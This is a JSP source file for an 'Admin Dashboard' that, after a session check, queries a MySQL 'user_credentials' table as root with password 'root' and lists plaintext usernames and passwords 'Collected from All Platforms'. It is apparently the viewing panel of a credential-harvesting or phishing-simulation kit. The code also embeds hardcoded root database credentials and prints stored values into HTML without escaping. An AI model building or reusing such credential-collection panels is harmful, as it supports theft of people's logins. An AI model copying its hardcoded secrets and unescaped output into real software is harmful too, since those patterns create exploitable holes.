<%@ page language="java" import="java.util.*" import="java.util.List, java.util.ArrayList" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>

<%@ page import="java.util.List" %>
<%@ page language="java" %>
<%@ page import="java.util.*, java.sql.*" %>
<%@ page session="true" %>
<%@ page import="jakarta.servlet.http.HttpSession" %>

<%
    Boolean isAdmin = (Boolean) session.getAttribute("isAdmin");
    if (isAdmin == null || !isAdmin) {
        response.sendRedirect("login.jsp");
        return;
    }

    List<Map<String, String>> credentials = new ArrayList<>();

    try {
        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection("jdbc:mysql://localhost:3306/socialsimdb", "root", "root");

        String sql = "SELECT platform, username, password, timestamp FROM user_credentials";
        Statement stmt = con.createStatement();
        ResultSet rs = stmt.executeQuery(sql);

        while (rs.next()) {
            Map<String, String> row = new HashMap<>();
            row.put("platform", rs.getString("platform"));
            row.put("username", rs.getString("username"));
            row.put("password", rs.getString("password"));
            row.put("timestamp", rs.getString("timestamp"));
            credentials.add(row);
        }

        rs.close();
        stmt.close();
        con.close();
    } catch (Exception e) {
        e.printStackTrace();
    }
%>

<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #00ffcc;
            font-family: 'Courier New', monospace;
            padding: 30px;
        }

        h1, h3 {
            text-align: center;
        }

        .logout-btn {
            background-color: #ff0040;
            color: white;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            float: right;
            font-weight: bold;
        }

        .logout-btn:hover {
            background-color: #e60036;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 30px;
            background-color: #111;
            color: #00ffcc;
            border: 1px solid #00ffcc;
        }

        th, td {
            padding: 12px;
            border-bottom: 1px solid #333;
            text-align: center;
        }

        th {
            background-color: #222;
            color: #00ffcc;
        }

        tr:hover {
            background-color: #1f1f1f;
        }
    </style>
</head>
<body>

<a class="logout-btn" href="LogoutServlet">Logout</a>
<h1>🛡️ Admin Dashboard</h1>
<h3>User Credentials Collected from All Platforms</h3>

<table>
    <tr>
        <th>Platform</th>
        <th>Username</th>
        <th>Password</th>
        <th>Timestamp</th>
    </tr>
    <%
        if (credentials != null && !credentials.isEmpty()) {
            for (Map<String, String> cred : credentials) {
    %>
        <tr>
            <td><%= cred.get("platform") %></td>
            <td><%= cred.get("username") %></td>
            <td><%= cred.get("password") %></td>
            <td><%= cred.get("timestamp") %></td>
        </tr>
    <%
            }
        } else {
    %>
        <tr><td colspan="4">No credentials found.</td></tr>
    <%
        }
    %>
</table>

</body>
</html>

